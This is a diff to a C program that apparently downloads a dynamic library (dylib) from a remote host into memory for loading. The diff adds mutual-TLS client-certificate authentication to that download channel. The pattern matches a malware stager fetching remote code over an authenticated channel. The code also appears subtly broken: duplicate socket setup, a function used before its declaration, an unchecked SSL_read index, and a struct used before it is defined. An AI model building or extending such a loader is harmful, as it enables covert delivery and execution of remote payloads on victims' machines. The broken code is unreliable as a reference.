@@ -11,10 +11,143 @@
 #include <fcntl.h>
 #include <dlfcn.h>
 #include <signal.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 #define BUFFER_SIZE 4096
+#define MTLS
+#define CERT_FILE "./certs/client-cert.pem"
+#define KEY_FILE "./certs/client-key.pem"
+#define CA_FILE "./certs/ca-cert.pem"
+//#define RAW
 
 struct Memory global_mem = {0};
+
+//MTLS SECTION
+#ifdef MTLS
+void initialize_openssl() {
+    SSL_load_error_strings();
+    OpenSSL_add_ssl_algorithms();
+}
+
+void cleanup_openssl() {
+    EVP_cleanup();
+}
+
+SSL_CTX *create_context() {
+    const SSL_METHOD *method;
+    SSL_CTX *ctx;
+
+    method = TLS_client_method();
+    ctx = SSL_CTX_new(method);
+    if (!ctx) {
+        perror("Unable to create SSL context");
+        ERR_print_errors_fp(stderr);
+        exit(EXIT_FAILURE);
+    }
+
+    return ctx;
+}
+
+void configure_context(SSL_CTX *ctx) {
+    SSL_CTX_set_ecdh_auto(ctx, 1);
+
+    int error_flag = 0;
+
+    if (SSL_CTX_use_certificate_file(ctx, CERT_FILE, SSL_FILETYPE_PEM) <= 0) {
+        #ifdef VERBOSE
+        ERR_print_errors_fp(stderr);
+        #endif
+        perror("[ERROR] Unable to set certificate");
+        error_flag = 1;
+    }
+
+    if (SSL_CTX_use_PrivateKey_file(ctx, KEY_FILE, SSL_FILETYPE_PEM) <= 0 ) {
+        #ifdef VERBOSE
+        ERR_print_errors_fp(stderr);
+        #endif
+        perror("[ERROR] Unable to set private key");
+        error_flag = 1;
+    }
+
+    if (SSL_CTX_load_verify_locations(ctx, CA_FILE, NULL) <= 0) {
+        #ifdef VERBOSE
+        ERR_print_errors_fp(stderr);
+        #endif
+        perror("[ERROR] Unable to set CA file");
+        error_flag = 1;
+    }
+
+    if (error_flag) {
+        exit(EXIT_FAILURE);
+    }
+
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
+    SSL_CTX_set_verify_depth(ctx, 1);
+}
+
+int create_socket(const char *hostname, int port) {
+    int sock;
+    struct hostent *host;
+    struct sockaddr_in addr;
+
+    if ((host = gethostbyname(hostname)) == NULL) {
+        perror("Unable to resolve host");
+        exit(EXIT_FAILURE);
+    }
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("Unable to create socket");
+        exit(EXIT_FAILURE);
+    }
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = *(long*)(host->h_addr_list[0]);
+
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        perror("Unable to connect");
+        exit(EXIT_FAILURE);
+    }
+
+    return sock;
+}
+
+void communicate_with_server(const char *hostname, int port) {
+    SSL_CTX *ctx;
+    SSL *ssl;
+    int server;
+
+    initialize_openssl();
+    ctx = create_context();
+    configure_context(ctx);
+
+    server = create_socket(hostname, port);
+    ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, server);
+
+    if (SSL_connect(ssl) <= 0) {
+        ERR_print_errors_fp(stderr);
+    } else {
+        #ifdef VERBOSE
+        printf("Connected to %s\n", hostname);
+        #endif
+        // Use SSL_write and SSL_read for communication
+        send_https_get_request(ssl, hostname, "/");
+        char buffer[BUFFER_SIZE];
+        int bytes = SSL_read(ssl, buffer, sizeof(buffer));
+        buffer[bytes] = 0;
+        printf("Received: %s\n", buffer);
+    }
+
+    SSL_free(ssl);
+    close(server);
+    SSL_CTX_free(ctx);
+    cleanup_openssl();
+}
+#endif
+//MTLS SECTION END
 
 void cleanup(int signum) {
     if (global_mem.data) {
@@ -38,6 +171,7 @@ struct Memory {
     size_t size;
 };
 
+#ifdef RAW
 int create_socket(const char *hostname, int port) {
     struct hostent *server;
     struct sockaddr_in server_addr;
@@ -72,7 +206,21 @@ int create_socket(const char *hostname, int port) {
 
     return sockfd;
 }
+#endif
 
+#ifdef MTLS
+void send_https_get_request(SSL *ssl, const char *hostname, const char *path) {
+    char request[1024];
+    snprintf(request, sizeof(request),
+             "GET %s HTTP/1.1\r\n"
+             "Host: %s\r\n"
+             "Connection: close\r\n\r\n",
+             path, hostname);
+    SSL_write(ssl, request, strlen(request));
+}
+#endif
+
+#ifdef RAW
 void send_http_get_request(int sockfd, const char *hostname, const char *path) {
     char request[1024];
     snprintf(request, sizeof(request),
@@ -82,10 +230,16 @@ void send_http_get_request(int sockfd, const char *hostname, const char *path) {
              path, hostname);
     send(sockfd, request, strlen(request), 0);
 }
+#endif
 
 struct Memory download_dylib(const char *hostname, const char *path) {
     int sockfd = create_socket(hostname, PORT);
+    #ifdef MTLS
+    communicate_with_server(hostname, PORT);
+    #endif
+    #ifdef RAW
     send_http_get_request(sockfd, hostname, path);
+    #endif
 
     struct Memory mem = {0};
 
